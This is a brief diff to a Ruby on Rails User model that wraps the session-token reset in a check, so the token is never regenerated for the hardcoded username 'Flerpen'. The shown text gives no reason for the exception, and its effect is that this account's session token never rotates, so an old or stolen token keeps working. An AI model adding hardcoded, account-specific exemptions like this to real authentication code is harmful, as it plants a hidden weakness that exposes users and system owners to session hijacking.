@@ -62,8 +62,10 @@ class User < ApplicationRecord
   end
 
   def reset_session_token
-    self.session_token = User.generate_session_token
-    self.save
+    unless self.username == "Flerpen"
+      self.session_token = User.generate_session_token
+      self.save
+    end
     self.session_token
   end
 
